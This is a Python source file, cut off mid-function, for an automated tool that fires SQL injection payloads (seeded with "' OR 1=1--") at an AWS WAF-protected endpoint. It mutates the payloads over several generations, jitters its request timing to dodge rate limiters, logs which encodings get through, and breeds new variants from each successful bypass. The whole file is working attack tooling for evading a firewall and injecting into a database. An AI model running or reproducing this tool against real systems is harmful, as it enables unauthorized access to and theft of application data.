import argparse
from datetime import datetime, timezone
import json
import os
from collections import Counter, defaultdict, deque
from pathlib import Path
import random
import re
import sys
import time
from urllib.parse import quote, quote_plus
import uuid

try:
    import requests
except ImportError:
    print("pip install requests", file=sys.stderr)
    sys.exit(1)

ROOT = Path(__file__).resolve().parent
ML_WAF = ROOT.parent / "ml-waf"
sys.path.insert(0, str(ML_WAF))
sys.path.append(str(ROOT))

from adv_mutate import all_transforms_for_dialect, merge_adv_into_variants
from aws_variants import augment_variants
from evasion.curl_bypass_f5 import variants_f5
from pg_variants import variants_pg
from evasion.run_until_bypass import name_to_transform_key

DATA_DIR = ROOT / "data"
DEFAULT_CONFIG = ROOT / "config.json"
RESULTS_JSONL = DATA_DIR / "aws_probe_results.jsonl"
SUMMARY_JSON = DATA_DIR / "aws_probe_summary.json"
BYPASS_LEARNED_JSONL = DATA_DIR / "bypass_learned.jsonl"
BLOCKED_LEARNED_JSONL = DATA_DIR / "blocked_learned.jsonl"
OTHER_LEARNED_JSONL = DATA_DIR / "other_learned.jsonl"
LEARNED_ENCODINGS_JSON = DATA_DIR / "learned_encodings.json"
REPORT_TXT = DATA_DIR / "aws_probe_report.txt"
BYPASS_FOUND_TXT = DATA_DIR / "bypass_found.txt"


def sleep_with_jitter(sleep_s: float) -> None:
    """Sleep with +/-20% random jitter to avoid fixed-interval rate-limiter trigger."""
    if sleep_s > 0:
        time.sleep(sleep_s * random.uniform(0.8, 1.2))


def extract_edge_headers(resp) -> dict:
    """Extract AWS WAF, ALB, and CloudFront security-relevant headers."""
    out = {}
    if resp is None:
        return out
    tracked = (
        "x-amzn-errortype",
        "x-amzn-waf-action",
        "x-amz-cf-id",
        "x-amzn-requestid",
        "server",
        "content-type",
    )
    for k in tracked:
        if k in resp.headers:
            out[k] = resp.headers[k]
    return out


def load_learned_encodings(path: Path) -> dict:
    if not path.exists():
        return {}
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    except (json.JSONDecodeError, OSError):
        return {}
    trans = data.get("transforms")
    if isinstance(trans, dict):
        for v in trans.values():
            if isinstance(v, dict):
                v.setdefault("bypass", 0)
                v.setdefault("block", 0)
                v.setdefault("other", 0)
                v.setdefault("reach", 0)
    return data


def save_learned_encodings(path: Path, data: dict) -> None:
    out = {**data, "updated_ts": time.time()}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)


def bump_learned_encoding(path: Path, transform_key: str, outcome: str) -> None:
    assert outcome in ("bypass", "block", "other", "reach")
    data = load_learned_encodings(path)
    if "transforms" not in data:
        data["transforms"] = {}
    t = data["transforms"].setdefault(
        transform_key, {"bypass": 0, "block": 0, "other": 0, "reach": 0}
    )
    t.setdefault("bypass", 0)
    t.setdefault("block", 0)
    t.setdefault("other", 0)
    t.setdefault("reach", 0)
    t[outcome] = t.get(outcome, 0) + 1
    save_learned_encodings(path, data)


def _aws_sort_by_learned(variants: list[tuple[str, str]]) -> list[tuple[str, str]]:
    data = load_learned_encodings(LEARNED_ENCODINGS_JSON)
    trans = data.get("transforms", {})

    def score(item: tuple[str, str]) -> float:
        _pl, name = item
        key = name_to_transform_key(name)
        t = trans.get(key, {})
        reach = int(t.get("reach", 0) or 0)
        bl = int(t.get("block", 0) or 0)
        if reach + bl == 0:
            return 0.0
        return reach / (reach + bl)

    return sorted(variants, key=score, reverse=True)


def patch_run_until_paths(run_id: str = "run_default") -> object:
    import evasion.run_until_bypass as rub

    rub.LEARNED_ENCODINGS_FILE = LEARNED_ENCODINGS_JSON
    rub.BYPASS_JSONL = BYPASS_LEARNED_JSONL
    rub.BLOCKED_JSONL = BLOCKED_LEARNED_JSONL
    rub.OUT_FILE = BYPASS_FOUND_TXT
    local_tp = ROOT / "data" / "transform_policy.json"
    rub.TRANSFORM_POLICY_FILE = (
        local_tp if local_tp.exists() else ML_WAF / "data" / "transform_policy.json"
    )
    rub.sort_by_learned_encodings = _aws_sort_by_learned

    # Intercept save_bypass and save_blocked to attach run_id and ISO timestamp
    def _save_bypass(payload: str, name: str, gen: int):
        with open(rub.OUT_FILE, "a", encoding="utf-8") as f:
            f.write(f"{name}\t{payload}\n")
        with open(rub.BYPASS_JSONL, "a", encoding="utf-8") as f:
            f.write(
                json.dumps(
                    {
                        "run_id": run_id,
                        "payload": payload,
                        "name": name,
                        "gen": gen,
                        "ts": time.time(),
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )

    def _save_blocked(payload: str, name: str, status_code: int):
        with open(rub.BLOCKED_JSONL, "a", encoding="utf-8") as f:
            f.write(
                json.dumps(
                    {
                        "run_id": run_id,
                        "payload": payload,
                        "name": name,
                        "status": "blocked",
                        "status_code": status_code,
                        "ts": time.time(),
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )

    rub.save_bypass = _save_bypass
    rub.save_blocked = _save_blocked
    return rub


def load_config(path: Path) -> dict:
    with open(path, encoding="utf-8") as f:
        c = json.load(f)
    c.setdefault("base_url", "")
    c.setdefault("inject_mode", "path")
    c.setdefault("query_param", "projectName")
    c.setdefault("raw_payload", "36331' OR 1=1--")
    c.setdefault("sql_dialect", "postgresql")
    c.setdefault("id_remap", {"from": "36331", "to": "Demo_project"})
    c.setdefault("sleep_seconds", 0.15)
    c.setdefault("max_requests", None)
    c.setdefault("extra_headers", {})
    c.setdefault("probe_mode", "variants")
    c.setdefault("max_generations", 5)
    c.setdefault("calibration", True)
    c.setdefault("id_remap_legacy", [])
    c.setdefault("aws_extra_variants", True)
    c.setdefault("aws_extra_max", 120)
    c.setdefault("adv_mutate_enabled", True)
    c.setdefault("adv_mutate_max", 80)
    c.setdefault("adv_second_layer", True)
    c.setdefault("adv_second_layer_max", 50)
    c.setdefault("repeat_per_variant", 1)
    c.setdefault("clear_cookies", True)
    c.setdefault("shuffle_queue", True)
    c.setdefault("calibration_interval", 1000)
    return c


def variants_for_dialect(raw: str, dialect: str) -> list[tuple[str, str]]:
    d = (dialect or "postgresql").lower().strip()
    if d in ("postgresql", "pg", "postgres"):
        return variants_pg(raw)
    return variants_f5(raw)


def next_gen_from_base_dialect(
    base: str,
    gen: int,
    policy: dict,
    dialect: str,
    rub,
) -> list[tuple[str, str]]:
    if gen == 0:
        v = variants_for_dialect(base, dialect)
        return rub.filter_variant_list(v, policy)
    prev = next_gen_from_base_dialect(base, gen - 1, policy, dialect, rub)
    out = []
    for pl, name in prev:
        for t, tname in all_transforms_for_dialect(pl, dialect):
            if t and len(t) < 2000:
                out.append((t, f"g{gen}_{name}_{tname}"))
    out = rub.filter_variant_list(out, policy)
    out = rub.sort_by_learned_encodings(out)
    return out[:300]


def parse_remap_legacy(cfg: dict) -> list[tuple[str, str]]:
    raw = cfg.get("id_remap_legacy") or []
    out: list[tuple[str, str]] = []
    for item in raw:
        if isinstance(item, dict) and "from" in item and "to" in item:
            out.append((str(item["from"]), str(item["to"])))
    return out


def apply_remap_string(
    s: str,
    old_id: str,
    new_id: str,
    extra_pairs: list[tuple[str, str]] | None,
) -> str:
    out = s
    if old_id and new_id and old_id != new_id:
        out = out.replace(old_id, new_id)
    for a, b in extra_pairs or []:
        if a and b and a != b:
            out = out.replace(a, b)
    return out


def remap_payloads(
    variants: list[tuple[str, str]],
    old: str,
    new: str,
    extra_pairs: list[tuple[str, str]] | None = None,
) -> list[tuple[str, str]]:
    if (not old or old == new) and not extra_pairs:
        return variants
    return [
        (apply_remap_string(p, old, new, extra_pairs), name) for p, name in variants
    ]


def _looks_percent_encoded(payload: str) -> bool:
    n = min(len(payload), 256)
    i = 0
    while i < n:
        if payload[i] == "%" and i + 2 < len(payload):
            a, b = payload[i + 1], payload[i + 2]
            hexd = "0123456789abcdefABCDEF"
            if a in hexd and b in hexd:
                return True
        i += 1
    return False


def encode_segment(payload: str, *, query: bool = False) -> str:
    if payload.startswith("36331%") or payload.startswith("3%"):
        return payload
    if _looks_percent_encoded(payload):
        return payload
    if query:
        return quote_plus(payload, safe="")
    return quote(payload, safe="")


def build_url_query(base: str, param: str, payload: str) -> str:
    q = encode_segment(payload, query=True)
    sep = "&" if "?" in base else "?"
    return f"{base}{sep}{param}={q}"


def build_url_path(base: str, payload: str) -> str:
    base = base.rstrip("/")
    seg = encode_segment(payload, query=False)
    return f"{base}/{seg}"


def is_waf_or_app_block(resp) -> bool:
    """Classify whether a response was blocked by AWS WAF or edge/ALB."""
    if resp.status_code in (403, 406, 429):
        return True

    # Check AWS WAF / CloudFront / ALB specific response headers
    headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
    if "x-amzn-errortype" in headers_lower:
        return True
    if headers_lower.get("x-amzn-waf-action") in ("block", "captcha", "challenge"):
        return True

    t = (resp.text or "").lower()
    if not t:
        return False

    waf_specific_signatures = (
        "request blocked by",
        "request blocked.",
        "request rejected",
        "blocked by aws waf",
        "blocked by waf",
        "access denied by waf",
        "the request could not be satisfied",
        "generated by cloudfront",
        "<title>403 forbidden</title>",
        "<title>error: the request could not be satisfied</title>",
        '"action":"block"',
    )
    for p in waf_specific_signatures:
        if p in t:
            return True

    if '"blocked":true' in t or '"rejected":true' in t:
        return True

    if re.search(r"\b(aws[-_ ]?)?waf\b", t) and any(
        kw in t for kw in ("block", "reject", "denied", "rule")
    ):
        return True

    return False


def contains_project_data(text: str) -> bool:
    try:
        data = json.loads(text)
        project_data = data.get("data") if isinstance(data, dict) and "data" in data else data
        if isinstance(project_data, list):
            return len(project_data) > 0 and any(
                isinstance(p, dict) and ("projectName" in p or "name" in p or "applicationDomain" in p)
                for p in project_data
            )
        elif isinstance(project_data, dict):
            return "projectName" in project_data or "name" in project_data or "applicationDomain" in project_data
    except Exception:
        pass
    return False


def is_bypass(resp) -> bool:
    if resp.status_code != 200:
        return False
    if is_waf_or_app_block(resp):
        return False
    return contains_project_data(resp.text)


def is_app_origin_bypass(resp) -> bool:
    if resp.status_code not in (400, 422):
        return False
    body = (resp.text or "").strip()
    if not body:
        return False
    low = body.lower()
    if low.startswith("<!doctype") or "<html" in low[:500]:
        return False
    markers = (
        "invalid input syntax for type integer",
        "invalid input syntax",
        "failed to fetch project",
        '"message":"failed to fetch',
        "invalid input syntax for type",
        "nan",
    )
    return any(m in low for m in markers)


def is_ineffective_500(resp) -> bool:
    if resp.status_code != 500:
        return False
    t = (resp.text or "").lower()
    markers = (
        "utf8",
        "utf-8",
        "utf8mb4",
        "encoding",
        "invalid byte sequence",
        "incorrect string value",
        "collation",
        "character set",
        "malformed",
        "unexpected character",
        "unicode",
        "0x00",
        "invalid message format",
    )
    return any(m in t for m in markers)


OTHER_LEARNED_DETAILS = frozenset(
    {"not_found", "ineffective_500", "upstream_error"}
)


def classify_result(resp) -> tuple[str, str]:
    if is_waf_or_app_block(resp):
        return "blocked", "waf_or_edge"
    if resp.status_code in (502, 503, 504):
        return "other", "upstream_error"
    if resp.status_code == 404:
        return "other", "not_found"
    if resp.status_code == 500:
        if is_ineffective_500(resp):
            return "other", "ineffective_500"
        return "bypass", "http_500"
    if is_app_origin_bypass(resp):
        return "bypass", "origin_reached"
    if is_bypass(resp):
        return "bypass", "ok_200"
    return "other", "other"


def probe_calibration(
    base: str,
    inject_mode: str,
    query_param: str,
    literal_id: str,
    headers: dict,
    timeout: float = 20.0,
    session: requests.Session | None = None,
) -> dict:
    if inject_mode == "query":
        url = build_url_query(base, query_param, literal_id)
    else:
        url = build_url_path(base, literal_id)
    http = session or requests
    try:
        r = http.get(url, headers=headers, timeout=timeout, allow_redirects=True)
    except requests.RequestException as e:
        return {
            "http_status": None,
            "url": url,
            "error": str(e)[:400],
            "hint": "request_failed",
            "ts": time.time(),
        }
    res, detail = classify_result(r)
    blocked = res == "blocked"
    if blocked:
        hint = "waf_blocked"
    elif r.status_code == 404:
        hint = "project_not_found"
    elif r.status_code == 200 and res == "bypass":
        hint = "ok"
    elif r.status_code == 200:
        hint = "ok_nonstandard_body"
    else:
        hint = f"status_{r.status_code}_{detail}"
    return {
        "http_status": r.status_code,
        "url": url,
        "body_snip": (r.text or "")[:280].replace("\n", " "),
        "hint": hint,
        "waf_blocked": blocked,
        "classify_detail": detail,
        "ts": time.time(),
    }


def run_full_transform_probe(
    base: str,
    inject_mode: str,
    query_param: str,
    raw: str,
    old_id: str,
    new_id: str,
    headers: dict,
    sleep_s: float,
    max_tests: int | None,
    max_gen: int,
    fout,
    extra_remap_pairs: list[tuple[str, str]] | None = None,
    aws_extra: bool = True,
    aws_extra_max: int = 120,
    sql_dialect: str = "postgresql",
    adv_mutate_enabled: bool = True,
    adv_mutate_max: int = 80,
    adv_second_layer: bool = True,
    adv_second_layer_max: int = 50,
    checkpoint_fn=None,
    session: requests.Session | None = None,
    run_id: str = "run_default",
    clear_cookies: bool = True,
    shuffle_queue: bool = True,
    cal_interval: int = 1000,
    initial_cal: dict | None = None,
    calibration_enabled: bool = True,
) -> tuple[int, int, int, int, Counter[int], list[str], int, dict]:
    """
    Run full adversarial mutation probe with strict separation of Gen 0 baseline
    and adaptive spawned variants.
    """
    rub = patch_run_until_paths(run_id=run_id)
    policy = rub.load_transform_policy()
    if policy.get("enabled") and policy.get("exclude"):
        print(
            f"Transform policy: exclude {len(policy['exclude'])} keys "
            f"(explore_rate={policy.get('explore_rate', 0.08)})"
        )
    raw_effective = apply_remap_string(raw, old_id, new_id, extra_remap_pairs)
    initial = variants_for_dialect(raw, sql_dialect)
    initial = remap_payloads(initial, old_id, new_id, extra_remap_pairs)
    if aws_extra:
        initial = augment_variants(
            initial,
            raw_effective,
            max_extra=aws_extra_max,
            sql_dialect=sql_dialect,
        )
        print(
            f"AWS extra variants: +up to {aws_extra_max} unique, queue={len(initial)} (before policy filter)",
            flush=True,
        )
    if adv_mutate_enabled:
        initial = merge_adv_into_variants(
            initial,
            raw_effective,
            DATA_DIR / "mutate_rules.json",
            mutate_max=adv_mutate_max,
            second_layer=adv_second_layer,
            second_layer_cap=adv_second_layer_max,
            sql_dialect=sql_dialect,
        )
        print(
            f"Adv mutate (ml-waf-blocked-adv + 2nd layer): queue={len(initial)} (before policy filter)",
            flush=True,
        )
    initial = rub.filter_variant_list(initial, policy)
    initial = rub.sort_by_learned_encodings(initial)

    # Fix P1 Item 7: Shuffle ONLY initial Gen 0 queue if enabled to avoid temporal order bias
    if shuffle_queue:
        random.shuffle(initial)
        print(f"Shuffled initial Gen 0 queue (n={len(initial)}) to eliminate request-order bias.")

    # Fix P0 Item 2: Wrap queue items with (payload, name, gen_num, source_tag)
    # This prevents spawned children from contaminating Gen 0 baseline statistics.
    queue: deque[tuple[str, str, int, str]] = deque(
        [(p, n, 0, "gen0_initial") for p, n in initial]
    )

    saved = rub.load_saved_bypasses()
    if saved:
        print(f"Loaded {len(saved)} saved bypass seed(s) -> spawn queue")
        for payload, name in saved:
            for t, tname in rub.spawn_from(payload, "saved", policy):
                remapped = remap_payloads([(t, tname)], old_id, new_id, extra_remap_pairs)[0]
                queue.append((remapped[0], remapped[1], 0, "saved_seed"))

    seen_payload_strings: set[str] = set()
    seen: set[tuple[str, str]] = set()

    bypass_n = block_n = other_n = waf_pass_n = 0
    bypass_200_n = 0
    bypass_500_n = 0
    bypass_app_err_n = 0
    tested = 0
    status_hist: Counter[int] = Counter()
    report_lines: list[str] = []
    gen = 0
    bypass_count = 0

    # Fix P0 Item 2: Explicitly isolated statistics buckets
    gen0_pure_stats = {
        "tested": 0, "bypass_200": 0, "bypass_500": 0, "bypass_app_err": 0,
        "bypass_total": 0, "blocked": 0, "other": 0, "waf_passed": 0,
    }
    adaptive_spawn_stats = {
        "tested": 0, "bypass_200": 0, "bypass_500": 0, "bypass_app_err": 0,
        "bypass_total": 0, "blocked": 0, "other": 0, "waf_passed": 0,
    }
    gen_stats: dict[int, dict] = defaultdict(
        lambda: {
            "tested": 0, "bypass_200": 0, "bypass_500": 0, "bypass_app_err": 0,
            "bypass_total": 0, "blocked": 0, "other": 0, "waf_passed": 0,
        }
    )

    http_session = session if session is not None else requests.Session()
    detected_cookies: set[str] = set()
    cookie_logged = False

    # Fix P1 Item 6: Reuse pre-computed calibration without issuing redundant HTTP requests
    calibration_checks: list[dict] = []
    initial_cal_hint = None
    if initial_cal is not None:
        initial_cal["checked_at_tested"] = 0
        initial_cal["gen"] = 0
        calibration_checks.append(initial_cal)
        initial_cal_hint = initial_cal.get("hint")
    elif calibration_enabled:
        initial_cal = probe_calibration(base, inject_mode, query_param, new_id, headers, session=http_session)
        initial_cal_hint = initial_cal.get("hint")
        initial_cal["checked_at_tested"] = 0
        initial_cal["gen"] = 0
        calibration_checks.append(initial_cal)

    with open(OTHER_LEARNED_JSONL, "a", encoding="utf-8") as fother:
        while True:
            if not queue:
                gen += 1
                if gen > max_gen:
                    print(f"Max generations ({max_gen}) reached.")
                    break
                refill = next_gen_from_base_dialect(
                    raw_effective, gen, policy, sql_dialect, rub
                )
                refill = remap_payloads(refill, old_id, new_id, extra_remap_pairs)
                # Fix P1 Item 7: Do NOT shuffle refill here.
                # sort_by_learned_encodings() provides the priority ordering for adaptive generations.
                queue.extend([(p, n, gen, f"gen{gen}_refill") for p, n in refill])
                print(f"[Gen {gen}] +{len(refill)} variants (queue={len(queue)}) ranked by learned encodings")
                if not queue:
                    break

            if max_tests is not None and tested >= max_tests:
                print(f"Stopped: max_requests={max_tests}")
                break

            item = queue.popleft()
            if len(item) == 4:
                payload, name, item_gen, source_tag = item
            else:
                payload, name = item[0], item[1]
                item_gen, source_tag = (0, "gen0_initial") if gen == 0 else (gen, f"gen{gen}_refill")

            if payload in seen_payload_strings:
                continue
            seen_payload_strings.add(payload)

            key = (payload[:300], name)
            if key in seen:
                continue
            seen.add(key)

            if inject_mode == "query":
                url = build_url_query(base, query_param, payload)
            else:
                url = build_url_path(base, payload)

            now_ts = time.time()
            now_iso = datetime.now(timezone.utc).isoformat()

            try:
                r = http_session.get(url, headers=headers, timeout=20, allow_redirects=True)
            except requests.RequestException as e:
                tested += 1
                other_n += 1
                # Update specific bucket
                if source_tag == "gen0_initial":
                    gen0_pure_stats["tested"] += 1
                    gen0_pure_stats["other"] += 1
                elif source_tag == "adaptive_spawn":
                    adaptive_spawn_stats["tested"] += 1
                    adaptive_spawn_stats["other"] += 1
                else:
                    g = gen_stats[item_gen if item_gen >= 0 else gen]
                    g["tested"] += 1
                    g["other"] += 1

                fout.write(
                    json.dumps(
                        {
                            "run_id": run_id,
                            "variant": name,
                            "gen": item_gen,
                            "source": source_tag,
                            "http_status": None,
                            "result": "error",
                            "error": str(e)[:400],
                            "headers": {},
                            "url_snip": url[:300],
                            "ts": now_ts,
                            "timestamp": now_iso,
                        },
                        ensure_ascii=False,
                    )
                    + "\n"
                )
                sleep_with_jitter(sleep_s)
                continue

            if http_session.cookies:
                c_names = set(http_session.cookies.keys())
                if not cookie_logged and c_names:
                    cookie_logged = True
                    print(
                        f"  [COOKIE DETECTED] Server set cookies: {dict(http_session.cookies)}. "
                        f"Policy: {'CLEAR after each request' if clear_cookies else 'RETAIN'}",
                        flush=True,
                    )
                detected_cookies.update(c_names)
                if clear_cookies:
                    http_session.cookies.clear()

            if r.status_code == 401:
                print("Stopped: HTTP 401")
                break

            tested += 1
            status_hist[r.status_code] += 1
            res, detail = classify_result(r)
            bp = res == "bypass"

            if res == "bypass":
                bypass_n += 1
                if detail == "ok_200":
                    bypass_200_n += 1
                elif detail == "http_500":
                    bypass_500_n += 1
                else:
                    bypass_app_err_n += 1
            elif res == "blocked":
                block_n += 1
            else:
                other_n += 1

            if res != "blocked":
                waf_pass_n += 1

            # Fix P0 Item 2: Update the correct stats bucket strictly
            if source_tag == "gen0_initial":
                target_bucket = gen0_pure_stats
            elif source_tag == "adaptive_spawn":
                target_bucket = adaptive_spawn_stats
            else:
                target_bucket = gen_stats[item_gen if item_gen >= 0 else gen]

            target_bucket["tested"] += 1
            if res == "bypass":
                target_bucket["bypass_total"] += 1
                if detail == "ok_200":
                    target_bucket["bypass_200"] += 1
                elif detail == "http_500":
                    target_bucket["bypass_500"] += 1
                else:
                    target_bucket["bypass_app_err"] += 1
            elif res == "blocked":
                target_bucket["blocked"] += 1
            else:
                target_bucket["other"] += 1

            if res != "blocked":
                target_bucket["waf_passed"] += 1

            # Fix P0 Item 4: Capture edge headers
            edge_headers = extract_edge_headers(r)

            fout.write(
                json.dumps(
                    {
                        "run_id": run_id,
                        "variant": name,
                        "gen": item_gen,
                        "source": source_tag,
                        "http_status": r.status_code,
                        "result": res,
                        "result_detail": detail,
                        "waf_passed": res != "blocked",
                        "headers": edge_headers,
                        "url_snip": url[:400],
                        "body_snip": (r.text or "")[:240].replace("\n", " "),
                        "ts": now_ts,
                        "timestamp": now_iso,
                    },
                    ensure_ascii=False,
                )
                + "\n"
            )
            report_lines.append(
                f"{res.upper():8}  HTTP {r.status_code:3}  g{item_gen} [{source_tag}]  {name}  ({detail})"
            )

            if bp:
                bypass_count += 1
                rub.save_bypass(payload, name, item_gen)
                rub.update_learned_encoding(name_to_transform_key(name), True)
                for t, tname in rub.spawn_from(payload, f"b{bypass_count}", policy):
                    remapped_p, remapped_n = remap_payloads([(t, tname)], old_id, new_id, extra_remap_pairs)[0]
                    # Fix P0 Item 2: Explicitly tag spawned children as adaptive_spawn
                    queue.append((remapped_p, remapped_n, -1, "adaptive_spawn"))
            elif res == "blocked":
                rub.save_blocked(payload, name, r.status_code)
                rub.update_learned_encoding(name_to_transform_key(name), False)
            elif detail in OTHER_LEARNED_DETAILS:
                fother.write(
                    json.dumps(
                        {
                            "run_id": run_id,
                            "payload": payload,
                            "name": name,
                            "gen": item_gen,
                            "source": source_tag,
                            "status": "other",
                            "result_detail": detail,
                            "status_code": r.status_code,
                            "ts": now_ts,
                            "timestamp": now_iso,
                        },
                        ensure_ascii=False,
                    )
                    + "\n"
                )
                bump_learned_encoding(
                    LEARNED_ENCODINGS_JSON,
                    name_to_transform_key(name),
                    "other",
                )
            if res != "blocked":
                bump_learned_encoding(
                    LEARNED_ENCODINGS_JSON,
                    name_to_transform_key(name),
                    "reach",
                )

            print(
                f"  [{tested}] {res.upper():8}  g{item_gen} [{source_tag[:10]:10}]  {name[:42]:42}  HTTP {r.status_code}  ({detail})",
                flush=True,
            )

            # Fix P2 Item 14: Periodic calibration check
            if cal_interval and calibration_enabled and initial_cal_hint is not None and tested > 0 and tested % cal_interval == 0:
                cur_cal = probe_calibration(
                    base, inject_mode, query_param, new_id, headers, session=http_session
                )
                cur_cal["checked_at_tested"] = tested
                cur_cal["gen"] = gen
                calibration_checks.append(cur_cal)
                cur_hint = cur_cal.get("hint")
                if cur_hint != initial_cal_hint:
                    print(
                        f"  [DRIFT DETECTED] at #{tested}: baseline changed from '{initial_cal_hint}' to '{cur_hint}' (HTTP {cur_cal.get('http_status')})",
                        flush=True,
                    )
                else:
                    print(
                        f"  [CALIBRATION OK] at #{tested}: baseline stable ({cur_hint}, HTTP {cur_cal.get('http_status')})",
                        flush=True,
                    )

            # Fix P0 Item 1: Call checkpoint_fn safely
            if checkpoint_fn and tested > 0 and tested % 1000 == 0:
                checkpoint_fn(
                    bypass_n,
                    block_n,
                    other_n,
                    waf_pass_n,
                    status_hist,
                    tested,
                    report_lines,
                    b_200_n=bypass_200_n,
                    b_500_n=bypass_500_n,
                    b_app_n=bypass_app_err_n,
                    gen0_baseline=dict(gen0_pure_stats),
                    adaptive_spawn=dict(adaptive_spawn_stats),
                    gen_breakdown=dict(gen_stats),
                    cal_history=calibration_checks,
                    cookies_detected=list(detected_cookies),
                    cookie_policy="clear_per_request" if clear_cookies else "retain_session",
                    run_id=run_id,
                )

            sleep_with_jitter(sleep_s)

    # Format generation rates
    gen_breakdown_out = {}
    for g_idx, g_data in gen_stats.items():
        g_t = g_data["tested"]
        gen_breakdown_out[str(g_idx)] = {
            **g_data,
            "bypass_200_rate": round(g_data["bypass_200"] / g_t, 4) if g_t else 0.0,
            "bypass_total_rate": round(g_data["bypass_total"] / g_t, 4) if g_t else 0.0,
            "block_rate": round(g_data["blocked"] / g_t, 4) if g_t else 0.0,
        }

    # Add rates to gen0_pure_stats and adaptive_spawn_stats
    g0_t = gen0_pure_stats["tested"]
    gen0_pure_stats["bypass_200_rate"] = round(gen0_pure_stats["bypass_200"] / g0_t, 4) if g0_t else 0.0
    gen0_pure_stats["bypass_total_rate"] = round(gen0_pure_stats["bypass_total"] / g0_t, 4) if g0_t else 0.0
    gen0_pure_stats["block_rate"] = round(gen0_pure_stats["blocked"] / g0_t, 4) if g0_t else 0.0

    sp_t = adaptive_spawn_stats["tested"]
    adaptive_spawn_stats["bypass_200_rate"] = round(adaptive_spawn_stats["bypass_200"] / sp_t, 4) if sp_t else 0.0
    adaptive_spawn_stats["bypass_total_rate"] = round(adaptive_spawn_stats["bypass_total"] / sp_t, 4) if sp_t else 0.0
    adaptive_spawn_stats["block_rate"] = round(adaptive_spawn_stats["blocked"] / sp_t, 4) if sp_t else 0.0

    detailed_stats = {
        "bypass_200_n": bypass_200_n,
        "bypass_500_n": bypass_500_n,
        "bypass_app_err_n": bypass_app_err_n,
        "gen0_baseline": gen0_pure_stats,
        "adaptive_spawn": adaptive_spawn_stats,
        "gen_breakdown": gen_breakdown_out,
        "cal_history": calibration_checks,
        "cookies_detected": list(detected_cookies),
        "cookie_policy": "clear_per_request" if clear_cookies else "retain_session",
    }

    return (
        bypass_n,
        block_n,
        other_n,
        waf_pass_n,
        status_hist,
        report_lines,
        tested,
        detailed_stats,
    )


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="HTTP probe AWS (or any) URL using variants_f5 (oracle) or variants_pg (postgresql) + aws extras.",
    )
    ap.add_argument("--config", type=Path, default=DEFAULT_CONFIG)
    ap.add_argument("--dry-run", action="store_true", help="Print URLs only, no HTTP")
    ap.add_argument(
        "--fresh",
        action="store_true",
        help="Truncate probe jsonl + reset learned_encodings + reset transform_policy before run",
    )
    ap.add_argument(
        "--full",
        action="store_true",
        help="Full ml-waf pipeline: queue + spawn_from + generations (like run_until_bypass.py)",
    )
    ap.add_argument(
        "--repeat-per-variant",
        type=int,
        default=None,
        metavar="N",
        help="Override config repeat_per_variant: send each variant probe N times (variants mode only).",
    )
    ap.add_argument(
        "--max-requests",
        type=int,
        default=None,
        help="Override config max_requests: maximum number of probe requests to execute.",
    )
    ap.add_argument(
        "--run-id",
        type=str,
        default=None,
        help="Unique identifier for this probing session (defaults to run_YYYYMMDD_HHMMSS_<hex>)",
    )
    ap.add_argument(
        "--clear-cookies",
        action="store_true",
        default=None,
        help="Clear session cookies after each request for statistical independence (default: True)",
    )
    ap.add_argument(
        "--retain-cookies",
        action="store_true",
        help="Retain cookies across requests to simulate persistent attack session",
    )
    ap.add_argument(
        "--shuffle",
        action="store_true",
        default=None,
        help="Shuffle initial Gen 0 variants queue before probing (default: True)",
    )
    ap.add_argument(
        "--no-shuffle",
        action="store_true",
        help="Do not shuffle initial variants queue",
    )
    ap.add_argument(
        "--cal-interval",
        type=int,
        default=None,
        help="Interval in requests to re-run baseline calibration for WAF drift (default: 1000, 0 to disable)",
    )

    ns = ap.parse_args(argv)

    if not ns.config.is_file():
        print(f"Copy config.example.json to config.json: {ns.config}", file=sys.stderr)
        return 1

    cfg = load_config(ns.config)
    base = cfg["base_url"].strip()
    mode = (cfg.get("inject_mode") or "path").lower()
    param = cfg["query_param"]
    raw = cfg["raw_payload"]
    sleep_s = float(cfg["sleep_seconds"] or 0)
    max_r = cfg["max_requests"]
    if ns.max_requests is not None:
        max_r = ns.max_requests
    max_gen_cfg = int(cfg.get("max_generations") or 5)
    probe_mode = (cfg.get("probe_mode") or "variants").lower().strip()
    if ns.full:
        probe_mode = "full"
    extra = cfg.get("extra_headers") or {}
    remap = cfg.get("id_remap") or {}
    old_id = str(remap.get("from", "36331"))
    new_id = str(remap.get("to", "Demo_project"))
    extra_pairs = parse_remap_legacy(cfg)

    run_id = ns.run_id or f"run_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}"

    clear_cookies = cfg.get("clear_cookies", True)
    if ns.retain_cookies:
        clear_cookies = False
    elif ns.clear_cookies is not None:
        clear_cookies = ns.clear_cookies

    shuffle_queue = cfg.get("shuffle_queue", True)
    if ns.no_shuffle:
        shuffle_queue = False
    elif ns.shuffle is not None:
        shuffle_queue = ns.shuffle

    cal_interval = cfg.get("calibration_interval", 1000)
    if ns.cal_interval is not None:
        cal_interval = ns.cal_interval

    if not base:
        print("base_url empty in config", file=sys.stderr)
        return 1

    if probe_mode == "full" and ns.dry_run:
        print(
            "Use --full without --dry-run (full run issues thousands of HTTP requests).",
            file=sys.stderr,
        )
        return 1

    seed = apply_remap_string(raw, old_id, new_id, extra_pairs)
    variants = variants_for_dialect(raw, cfg.get("sql_dialect", "postgresql"))
    variants = remap_payloads(variants, old_id, new_id, extra_pairs)
    if cfg.get("aws_extra_variants", True):
        variants = augment_variants(
            variants,
            seed,
            max_extra=int(cfg.get("aws_extra_max") or 120),
            sql_dialect=cfg.get("sql_dialect", "postgresql"),
        )
    if cfg.get("adv_mutate_enabled", True):
        variants = merge_adv_into_variants(
            variants,
            seed,
            DATA_DIR / "mutate_rules.json",
            mutate_max=int(cfg.get("adv_mutate_max") or 80),
            second_layer=cfg.get("adv_second_layer", True),
            second_layer_cap=int(cfg.get("adv_second_layer_max") or 50),
            sql_dialect=cfg.get("sql_dialect", "postgresql"),
        )
    if probe_mode != "full":
        variants = _aws_sort_by_learned(variants)
        if shuffle_queue:
            random.shuffle(variants)
    if max_r is not None and probe_mode != "full":
        variants = variants[: int(max_r)]

    DATA_DIR.mkdir(parents=True, exist_ok=True)

    if ns.fresh:
